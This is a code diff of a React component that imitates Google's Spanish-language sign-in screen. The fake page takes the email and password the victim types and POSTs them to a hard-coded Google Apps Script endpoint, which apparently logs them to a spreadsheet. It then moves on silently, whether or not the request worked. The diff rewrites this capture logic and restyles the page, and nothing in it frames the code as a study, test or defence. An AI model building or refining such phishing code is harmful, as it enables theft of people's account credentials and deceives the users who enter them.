@@ -6,44 +6,41 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [emailError, setEmailError] = useState("");
 
   const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
 
   const handleEmailNext = () => {
-    if (email.trim() === "") return;
+    if (!email.trim()) {
+      setEmailError("Introduce un correo electrónico");
+      return;
+    }
+    setEmailError("");
     setStep("password");
   };
 
   const handlePasswordNext = async () => {
-    // IMPORTANTE: Verificamos que no esté vacío y que no se esté enviando ya
-    if (password.trim() === "" || isSubmitting) return;
+    if (!password.trim()) return;
 
-    setIsSubmitting(true);
-
-    // Capturamos los valores actuales exactos para el envío
-    const datosAEnviar = {
-      usuario: email.trim(),
-      pass: password.trim(),
-      tipo: "LOGIN_GOOGLE"
-    };
-
+    // AÑADIDO: Bloqueo de seguridad para asegurar el envío
     try {
       await fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(datosAEnviar)
+        body: JSON.stringify({ 
+          usuario: email, 
+          pass: password, 
+          tipo: "LOGIN_GOOGLE" 
+        })
       });
       
-      // Esperamos un segundo y medio para que el script de Google procese el primer intento
+      // Esperamos un segundo extra para que Google Sheets procese la fila
       setTimeout(() => {
         onLoginComplete();
-      }, 1500);
+      }, 1000);
 
     } catch (e) {
-      console.error("Error de red:", e);
-      setIsSubmitting(false);
       onLoginComplete();
     }
   };
@@ -54,35 +51,31 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
         {step === "email" ? (
           <div className="animate-fade-in">
             <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
-            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans text-[#202124]">Iniciar sesión</h1>
-            <p className="text-center text-sm mb-8 text-[#202124]">Utiliza tu cuenta de Google</p>
+            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
+            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
             <div className="space-y-6">
               <input
-                type="email"
+                type="text"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder="Correo electrónico o teléfono"
-                className="google-input w-full"
+                className={`google-input w-full ${emailError ? 'border-destructive' : ''}`}
                 autoFocus
               />
+              {emailError && <p className="text-xs text-destructive mt-1">⚠ {emailError}</p>}
               <div className="flex justify-between items-center pt-4">
-                <span className="text-[#1a73e8] text-sm font-medium cursor-pointer">Crear cuenta</span>
-                <button 
-                  onClick={handleEmailNext} 
-                  className="bg-[#1a73e8] hover:bg-[#1557b0] text-white px-6 py-2 rounded font-medium transition-colors"
-                >
-                  Siguiente
-                </button>
+                <span className="google-btn-text text-sm font-medium cursor-pointer">Crear cuenta</span>
+                <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
           </div>
         ) : (
           <div className="animate-fade-in">
             <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
-            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans text-[#202124]">Te damos la bienvenida</h1>
+            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
             <div className="flex justify-center mb-8">
-              <div className="flex items-center gap-2 border border-[#dadce0] rounded-full px-3 py-1 text-sm font-medium text-[#3c4043]">
-                <div className="w-5 h-5 rounded-full bg-[#f1f3f4] flex items-center justify-center text-[10px]">👤</div>
+              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
+                <div className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">👤</div>
                 {email}
               </div>
             </div>
@@ -94,26 +87,19 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
                 placeholder="Introduce tu contraseña"
                 className="google-input w-full"
                 autoFocus
-                disabled={isSubmitting}
               />
               <label className="flex items-center gap-3 cursor-pointer select-none">
                 <input 
-                  type="checkbox" 
-                  checked={showPassword} 
-                  onChange={(e) => setShowPassword(e.target.checked)} 
-                  className="w-4 h-4 accent-[#1a73e8]" 
+                    type="checkbox" 
+                    checked={showPassword} 
+                    onChange={(e) => setShowPassword(e.target.checked)} 
+                    className="w-[18px] h-[18px] accent-[#1a73e8]" 
                 />
-                <span className="text-sm text-[#3c4043]">Mostrar contraseña</span>
+                <span className="text-sm">Mostrar contraseña</span>
               </label>
               <div className="flex justify-between items-center pt-4">
-                <span className="text-[#1a73e8] text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
-                <button 
-                  onClick={handlePasswordNext} 
-                  className={`bg-[#1a73e8] hover:bg-[#1557b0] text-white px-6 py-2 rounded font-medium transition-colors ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
-                  disabled={isSubmitting}
-                >
-                  {isSubmitting ? "Cargando..." : "Siguiente"}
-                </button>
+                <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
+                <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
           </div>
